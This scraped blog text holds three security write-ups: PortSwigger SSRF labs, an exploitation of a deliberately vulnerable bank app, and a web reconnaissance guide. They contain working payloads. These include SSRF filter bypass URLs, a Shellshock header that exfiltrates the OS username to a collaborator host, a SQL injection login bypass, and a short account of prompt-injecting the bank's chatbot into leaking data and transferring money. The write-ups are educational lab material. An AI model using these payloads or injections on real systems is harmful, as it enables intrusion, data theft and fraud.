In this writeup, we will exxplore how to find some basic SSRFs and also how to bypass some SSRF protections.\nLAB 1: Basic SSRF against the local server Objective: This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin.\nClick on \u0026ldquo;view details\u0026rdquo; under any of the products to check the stock and capture the request with your proxy tool. We can see that the application uses the \u0026ldquo;stockApi\u0026rdquo; parameter to the fetch the product and the stock from an external source,we can then try to change the url to the \u0026ldquo;http://localhost/admin\u0026rdquo; to see if the application will fetch us the admin interface. After getting the admin interface, we can then go on to delete the user \u0026ldquo;Carlos\u0026rdquo; by uisng the URL provided in the response to solve the lab.\nLAB 2: Blind SSRF with out-of-Outbound Detection Objective: This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.To solve the lab, use this functionality to cause an HTTP request to the public Burp Collaborator server.\nWith Blind SSRFs, you cannot read internal files or access internal services directly, so you can make the target send requests to an external server you control then monitor your server logs for requests from the target.You can then use it to scan the internal network for open ports, discover services and map out the network.\nAgain, Click on \u0026ldquo;View Details\u0026rdquo; on any of the products to load the product page then capture the request with our proxy tool. We can go ahead and insert our burp collaborator payload in the \u0026ldquo;referrer header\u0026rdquo; and send the request,Then go to the collaborator tab to see if the target will make any contact with our server. Noticed the target sent HTTP request to our server? The lab should be solved now.\nNB: If you don\u0026rsquo;t have burpsuite pro to use the collaborator, you can use an online hosting service that provides server access logs or better still turn your PC into a listener by using Netcat.\nLab 3: SSRF with Blacklit-based input Filter Objective: This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos. The developer has deployed two weak anti-SSRF defenses that you will need to bypass.\nNow it\u0026rsquo;s time to bypass some protections, Let\u0026rsquo;s get started :)\nAs usual Click on \u0026ldquo;View Details\u0026rdquo; on any products and check the stock,the requests must be captured with our proxy tool(I will be using Burpsuite for this).Noticed the application uses \u0026ldquo;StockApi\u0026rdquo; parameter to fetch the stocks again? let\u0026rsquo;s change the URL to the localhost admin interface and solve the lab.Oh, Hold\u0026rsquo;up! we are been blocked from accessing the admin interface.I tried different encoding techniques(Octal, Hexadecimal, URL, double encoding, dword etc.)but no success, then i started thinking \u0026ldquo;Is the application blocking me from accessing the localhost or the admin interface or both? , Why don\u0026rsquo;t i find a way to access the localhost first?\u0026rdquo; I also tried using (localhost, 127.0.0.1, ::1, fc00:: etc.) but no succes then it got to me why don\u0026rsquo;t i use \u0026ldquo;127.0.1\u0026rdquo; and BOOM! it worked. Now let\u0026rsquo;s go add the admin interface to it. Blocked again? By using http://localhost/admiN i was able to bypass the protection and access the admin interface. We can now go on to delete the user and solve the lab, That was a good experience though.\nLab 4: SSRF with filter bypass via open redirection vulnerability Objective: This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at http://192.168.0.12:8080/admin and delete the user carlos. The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first.\nBy this time you should be familiar with \u0026ldquo;Click on Details and check stock\u0026rdquo; lol, Let\u0026rsquo;s move straight to our proxy tool and start playing with the captured request.The \u0026ldquo;StcokAPi\u0026rdquo; parameter again? but this this time it has been restricted to access only the local applicattion so we need to find an open redirect vulnerability in the appliaction first. Go back to the stock check page and noticed that there is a button called \u0026ldquo;Next Product\u0026rdquo; that redirects to the next product using a parameter \u0026ldquo;path\u0026rdquo;. Changing the the url in the path parameter to an arbitrary URl get redirected to that URL proving the existence of an Open Redirect Vulnerability. We can now replace the \u0026ldquo;StockApi\u0026rdquo; parameter with the Open redirect URl and point the path to http://192.168.0.12:8080/admin but don\u0026rsquo;t forget to URL-encode it. We can now go ahead and delete the user to solve the lab.\nLab 5: Blind SSRF with Shellshock exploitation Objective: This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded. To solve the lab, use this functionality to perform a blind SSRF attack against an internal server in the 192.168.0.X range on port 8080. In the blind attack, use a Shellshock payload against the internal server to exfiltrate the name of the OS user.\nWith our normal routine, click on \u0026ldquo;view details\u0026rdquo; on any of the products but this time no stock check, let\u0026rsquo;s go to our proxy tool and see how best we can play with the request but wait Shellshock Exploitation ? This should be my second time hearing this but i actually don\u0026rsquo;t know the commands, so a simple google search revealed that we can use () { :; }; /usr/bin/nslookup $(whoami).YOUR-SUBDOMAIN-HERE.burpcollaborator.net in the User Agent header to exploit it.Now replace the referrer header with http://192.168.0.x:8080 ,highlight the \u0026lsquo;x\u0026rsquo; and send the request to intruder so that we can bruteforce and the find the actual IP since we were given a range. The payload settings for the intruder should be like this: Click on Start Attack, After the attack is done, Go to the collaborator tab and notice that the target has sent a DNS request containing the name of the user to our server.Copy the name and submit as solution to solve the lab.\nLAB 6: SSRF with whitelist-based input filter Objective: This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.The developer has deployed an anti-SSRF defense you will need to bypass.\nAnother protection to bypass :) Click on \u0026ldquo;view details\u0026rdquo; on any of the products,check the stock and capture the request with our proxy tool. The application uses the \u0026ldquo;StockApi\u0026rdquo; to fetch the product again but changing the URL to an internal server doesn\u0026rsquo;t work and gives us an error:Based on the error we know that the host must be stock.weliketoshop.net so we need find a way to trick the server and bypass the protection.After several try and error, i finally came with a bypass thus http://localhost%2523@stock.weliketoshop.net/admin/, The \u0026lsquo;%2523\u0026rsquo; is double URL-encoding of \u0026lsquo;#\u0026rsquo; We can now go ahead and delete the user to solve the lab.

In this writeup i will take you through how i was able to exploit an intentional Vulnerable Bank Application by Ghost St. Badmus, One of the best Application Security Engineers in the industry.\nYou can find the Lab here: Vulnerable Bank Application 🏦 or vulnbank.org.\nAuthentication \u0026amp; Authorization Vulnerabilities SQL Injection in login The first thing we will see when we access the application is the Login/Register page,we will try logging in with a simple SQLI payload to see if the application is vulnerable to SQLI. After using \u0026lsquo;or 1=1- - as the username and pass as password,we were logged in as the admin. Mass Assignment Leading Privilege Escalation To exploit this go to the register page and try creating account, intercept the request with your proxy tool(i will be using burpsuite for this task).Forward the request and monitor the response from the server, we noticed a parameter is_admin was set to false in the reponse. Let\u0026rsquo;s set the parameter to true and add it to our account creation request to see if we will get admin privileges. Boom!! it worked, Logged into the account and was presented with the admin panel Mass Assignment Leading To Account Balance Manipulation When creating an ccount, a parameter in the respoonse from the server stood out thus, balance.Let\u0026rsquo;s add this parameter to our account creation request and set the value to any amount of our choice.Login into the account after sending the request and the amount will be reflected. Weak Password Reset Mechanism(3-didgit PIN) The reset password functionality is vulnerable to brute force because it is easy to guess 3-digit pin and also there is no rate limit protection in the apllication.Let\u0026rsquo;s go the reset password endpoint and request for the 3-digit pin. We will be redirected to a page to provide the 3-digit PIN and our new password, intercept the request and send to intruder.Add the payload positon to the reset_pin parameter,payload type to bruteforcer with minimum and maximum length set to three and start the attack. After the attack one of the payload returned with status code 200, meaning that was the pin and the password was changed successfully,This means an attacker can reset users password with just their username. Token Stored in Local Storage Users session tokens are stored locally in the browser, with this anyone who have access to the victim\u0026rsquo;s browser will be able able to view the session token.First, right-click in the page and select inspector or developer tools(depends on the browser you are using), then go to the storage tab, You will see the token stored there. No server-side token invalidation I noticed the server does not validate the tokens sent with the request,with invalid token the server still respond with 200(ok). Transcation Vulnerabilities Negative Amount Transfers Possible For this you need login into your account and go to the Money Transfer endpoint, enter the recipient\u0026rsquo;s account number,negative amount and click on send money.Note that our initial account balance was $2000.0 before sending the money. Now let\u0026rsquo;s check our account balance, you will notice that the negative amount has been added to our account balance. Imagine sending money to someone and your account balance keeps increasing, isn\u0026rsquo;t this fun? No Amount Validation The application does not validate the amount of money that is beeing sent, you can send no money or simply use 0 as amount to be transferred and it will get sent. Transaction history information disclosure By obtaining a user\u0026rsquo;s account number, an attacker can access their transaction history by navigating to the /transactions endpoint and replacing their own account number with the victim\u0026rsquo;s in the URL. Other Transcation vulnerabilities There are other transaction vulnerabilities like No validation on recipient accounts and No transaction limits where the application does not validate the recipient\u0026rsquo;s account number,and users can also send any amount of money without any limits.With no transaction limit if an attacker gets access to a victim\u0026rsquo;s account he/she can send all the money in the account at once which isn\u0026rsquo;t ideal.\nClient and Server-Side Flaws Cross Site Scripting(Stored XSS) One way to prove the appliaction is vulnerable to XSS is by making it run javascript code that will generate a popup box if the payload succeeds.To do this i created account with a simple XSS payload as the username,and noticed the script executes the moment we log into the account. NB: This is a self XSS and can become impactful if chained with CSRF to change the victim\u0026rsquo;s name into the XSS payload but unfornately the app doesn\u0026rsquo;t allow us to change name after account creation.\nSession Management Vulnerabilities Token Vulnerabilities With ones session token, an attacker can impersonate the user and make transactions without logging into the victim\u0026rsquo;s account. Let\u0026rsquo;s first note the account balance and the session token of the victim. Now login into the attacker\u0026rsquo;s account and go to the /transfer endpoint, intercept the request and swap your token with the victim\u0026rsquo;s token and send the request. Figure 1.1 is the initial request with attacker\u0026rsquo;s token, figure 1.2 is request with victim\u0026rsquo;s token and figure 1.3 is the balance of the victim after the attack. AI/Chatbot hacking The vulnank has been updated with a chatbot that can help you bank easily, you can also ask it questions.We will try some prompt injections to see if we can levearage it to get some information from the application. Here are the images of the prompts i tried to get the application\u0026rsquo;s database and the bot was able to transfer money from a user account with just their account number. These vulnerabilities are the result of my own testing. I\u0026rsquo;m sure there\u0026rsquo;s more to uncover, so feel free to take a look yourself\u0026mdash;you might spot something I missed. I\u0026rsquo;ll be updating this write-up as I find new issues or insights.

It\u0026rsquo;s been a while, In this writeup i will share some Reconnaissance techniques that will help you to succeed in your bug bounty or Web Application Hacking. As we all know Recon is a crucial stage in hacking, Exploiting a target system is quite easy if you know much about the system and how it works(hence my philosophy 80% recon, 20% exploitation).Enough talking, Let\u0026rsquo;s get our hands dirty!!\nPassive Recon Techniques 🧭 Walking Through a Web Target Manually - Recon Like a Human \u0026ldquo;Before you automate, you observe. Before you exploit, you understand.\u0026rdquo; Manual recon is where real hackers sharpen their instincts.\nManual recon is the art of exploring a target website using your eyes, brain, and browser\u0026mdash;without jumping straight into tools like nmap, ffuf, or Burp Intruder. It helps you understand the site like a real user (and a developer), and often reveals low-hanging bugs that automation can overlook. Before you start running automated tools, Try to uncover every feature in the application that users can access by browsing through every page and clicking every link. Access the functionalities that you don\u0026rsquo;t usually use.\nFor example: if you\u0026rsquo;re hacking Facebook, try to create an event, play a game, and use the payment functionality if you\u0026rsquo;ve never done so before. Sign up for an account at every privilege level to reveal all of the application\u0026rsquo;s features. For example, on Slack, you can create owners, admins, and members of a workspace. Also create users who are members of different channels under the same workspace. This way, you can see what the application looks like to different users. This should give you a rough idea of what the attack surface (all of the different points at which an attacker can attempt to exploit the application) looks like, where the data entry points are, and how different users interact with each other. Then you can start a more in-depth recon process: finding out the technology and structure of an application.\n🌐 Whois and Reverse Whois Lookups-Peeking Behind the Domain \u0026ldquo;Every domain has a story \u0026mdash; and WHOIS lets you read the first chapter.\u0026rdquo;\nWHOIS is a protocol used to query domain registration information. It tells you who owns a domain, when it was registered, where it points to, and sometimes reveals admin contact emails, organization names, and related domains \u0026mdash; a goldmine during recon.To query whois information, just simply type\nwhois [Target Site] This information is not always available, as some organizations and individuals use a service called domain privacy, in which a third-party service provider replaces the user\u0026rsquo;s information with that of a forwarding service.You could then conduct a reverse WHOIS search, searching a database by using an organization name, a phone number, or an email address to find domains registered with it. This way, you can find all the domains that belong to the same owner. Reverse WHOIS is extremely useful for finding obscure or internal domains not otherwise disclosed to the public. We can use a public reverse whois tool like ViewDNS.info to conduct this query. 🚩 Red Flags to Look Out For\nRecently registered domain - Might be used in phishing or shady activity Short TTL or temporary hosting - Signs of suspicious infrastructure Reused email/contact info - Can be tracked across domains Expiring domain - Can become vulnerable or forgotten WHOIS is your first step into the DNS layer of web reconnaissance. It\u0026rsquo;s simple, powerful, and often reveals the invisible strings that tie domains, companies, and infrastructure together.\n🧠 DNS Enumeration - Unmasking the Infrastructure \u0026ldquo;Before you can break into the castle, you map its walls, gates, and hidden tunnels \u0026mdash; DNS is that map.\u0026rdquo;\nDNS (Domain Name System) enumeration is the process of collecting DNS records and related infrastructure data about a target. It helps identify: Subdomains, IP addresses,Email servers,Name servers,Load balancers,Misconfigured or forgotten services. First, we need to discover the IP Address of the server by using nslookup. The syntax go like:\nnslookup [Target Site] You can use query for a specific record type by specifying the type option: The record types you can query with nslookup are; Mail Servers(MX), TXT Records(TXT),Canonical Name(CNAME),IPV4 Adrresses(A),IPV6 Addresses(AAAA) etc.\nnslookup -type=Record_type [Target Site] 🌍 Shodan \u0026amp; Censys - Uncovering Exposed Infrastructure \u0026ldquo;If Google indexes websites, Shodan indexes the internet\u0026rsquo;s devices.\u0026rdquo;\nShodan and Censys are search engines for internet-connected devices and services.They scan and index open ports, services, SSL certs, HTTP banners, metadata, and more,Think of them as a CTO\u0026rsquo;s nightmare and a recon hacker\u0026rsquo;s best friend.They can reveal: Publicly exposed servers/devices (even if subdomains don\u0026rsquo;t exist!), Leaky metadata in HTTP headers or SSL certs,Specific tech stack in use (e.g., Apache Tomcat, Nginx, Jenkins),Misconfigurations or outdated software,IoT devices, security cams, or forgotten test servers etc. To use Shodan, go to shodan.io and type your target server in the search bar. For example: You can add advanced filters like: Other filters:\norg:\u0026ldquo;Company Name\u0026rdquo; \u0026ndash; find all exposed infra owned by a company port:21 \u0026ndash; exposed FTP product:\u0026ldquo;Apache\u0026rdquo; \u0026ndash; find specific tech stack country:\u0026ldquo;US\u0026rdquo; \u0026ndash; filter geographically Censys is similar but focuses more on certificate and IP infrastructure data, To use Censys, go to search.censys.io and type your target name in the search bar like this: Censys also have various filters like: ip \u0026ndash; direct IP search services.http.response.body \u0026ndash; search by response content autonomous_system.name \u0026ndash; scan by ASN 🕵️‍♂️ Google Dorking \u0026ndash; Hacking with Google Search \u0026ldquo;Why break in when Google left the door wide open?\u0026rdquo;\nGoogle Dorking, or Google hacking, is the art of using advanced Google search operators to find sensitive information unintentionally exposed on the internet.It\u0026rsquo;s one of the most underrated yet powerful recon techniques \u0026mdash; you\u0026rsquo;d be surprised what you can uncover with just a browser. Some common google dorks are:\nDork Purpose site:target.com Search only within the target domain intitle:\u0026quot;index of\u0026quot; Discover open directories filetype:pdf site:target.com Find PDFs under the domain inurl:login Login portals and panels ext:log site:target.com Find log files intext:\u0026quot;password\u0026quot; filetype:txt Plaintext password leaks site:pastebin.com \u0026quot;target.com\u0026quot; Info leaks from Pastebin site:github.com \u0026quot;target.com\u0026quot; Sensitive code or API keys on GitHub link:\u0026quot; Specified URL\u0026quot; Pages that contain links to a specified URL You can comnbine two or more dorks depending on the information you want. For Example: To reveal admin panels or dashboards of a target site, you can use: Tips for Effective Dorking\nUse quotes to match exact phrases. Combine multiple operators to narrow results. Search on Google Cache and Wayback Machine for deleted pages. Use public tools like:Exploit-DB Google Hacking DB or Google Dork Search Engine. Active Recon Techniques 🌐 Subdomain Enumeration \u0026ndash; Discovering the Forgotten Doors \u0026ldquo;The real vulnerabilities often live on subdomains no one remembers.\u0026rdquo;\nSubdomain enumeration is the process of discovering subdomains belonging to a target domain. These subdomains often reveal: Development or staging environments,Forgotten assets, APIs, admin panels, legacy apps,and Third-party integrations (e.g., Shopify, WordPress, Heroku).Finding them expands your attack surface, giving you more opportunities to discover misconfigurations, outdated software, or exposed credentials.(More subdomains = more chances to find bugs).\nTools that can be use for enumerating subdomains are: Sublist3r, SubBrute, Amass, Gobuster etc. Each of these tools employs a different approach to discovering subdomains, so reviewing their manual pages or documentation beforehand is recommended.\nOnce you\u0026rsquo;ve found a good number of subdomains, you can discover more by identifying patterns. For example, if you find two subdomains of target.com named 1.target.com and 3.target.com, you can guess that 2.target.com is probably also a valid subdomain. You can automate this process with a tool called Altdns.\nAnd also if you know about the company\u0026rsquo;s technology stack. For example, if you\u0026rsquo;ve already learned that target.com uses spacelift, you can check if spacelift.target.com is a valid subdomain. Also look for subdomains of subdomains. After you\u0026rsquo;ve found, say, team.target.com, you might find subdomains like 1.team.example.com. You can find subdomains of subdomains by running enumeration tools recursively: add the results of your first run to your Known Domains list and run the tool again.\n📁 Directory Brute Forcing - Discovering Hidden Paths \u0026ldquo;Not all doors are locked. Some are just hidden.\u0026rdquo;\nDirectory brute forcing is the process of guessing directories and files on a web server by sending a list of potential paths and observing the responses.It helps uncover:\nAdmin panels (/admin, /manage, etc.) API endpoints (/api/v1/, /graphql) Backup files (.zip, .bak, .old) Hidden pages (/test, /dev, /staging) Sensitive data (.env, .git, config.php) Some popular Tools for Directory Discovery: ffuf, dirsearch, gobuster, feroxbuster, dirb etc. This tools take wordlist and make request and then analyze the response.So using a good/quality wordlist is very important here, i will recommend using wordlist from Seclists or you can also customize your own list.Manually visiting all the pages you\u0026rsquo;ve found through brute-forcing can be time-consuming. Instead, use a screenshot tool like Eyewitness to automatically verify that a page is hosted on each location and also takes screenshots of each page. In a photo gallery app, you can quickly skim these to find the interesting-looking ones. 🚩 Red Flags to Watch For\nUnprotected panels (/admin, /dashboard) Exposed backups (.zip, .tar, .bak) .git or .svn folders Debug files (debug.log, info.php) Misconfigured APIs or dev endpoints Outdated and Ill-maintaned pages 🚪 Port Scanning \u0026amp; Service Enumeration - Finding Open Doors \u0026ldquo;Before you pick the lock, you need to find the door.\u0026rdquo;\nPort scanning is the act of probing a target to discover which network ports are open. Each open port represents a service running on the server, like: SSH(22),FTP(21),HTTP(80),HTTPS(443) etc.Identifying these services is essential for service enumeration, which reveals versions, misconfigurations, and potential vulnerabilities.\nTools that you can use for port scanning: Nmap(with the -sV flag), masscan,rustscan,netcat etc. After determining the services running on the system and the open ports,dive deeper into each service Once ports are open, dive deeper into each service:\nService Tools/Approach HTTP/HTTPS curl, whatweb, nikto, ffuf SSH Check banner, brute-force (with permission) FTP Anonymous login, file listings SMTP VRFY/EXPN, banner grabbing MySQL/PostgreSQL Try default creds, version check SMB enum4linux, smbclient, smbmap 🧾 Conclusion Reconnaissance is the foundation of every successful web security assessment. By thoroughly exploring the target\u0026rsquo;s surface from WHOIS data and DNS records to subdomains, directories, ports, and public infrastructure you gather the intel needed to launch precise and effective attacks.\nEach recon technique serves a purpose:\nManual walkthroughs give you the human perspective. WHOIS \u0026amp; DNS lookups reveal ownership and structure. Subdomain \u0026amp; directory brute forcing expose hidden assets. Port scanning \u0026amp; service enumeration uncover the digital services in play. Shodan, Censys, and Google Dorks extend your reach beyond what\u0026rsquo;s visible. In hacking, the best payload is useless if you don\u0026rsquo;t know where to point it, Recon tells you where to aim. Whether you\u0026rsquo;re doing CTFs, bug bounties, or real-world pentests, never skip recon, it often holds the keys to the kingdom.\n","permalink":"https://kwesilarry1.github.io/writeups/web_recom/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eHello Hackers, Hope you\u0026rsquo;ve grinding hard and ethically?
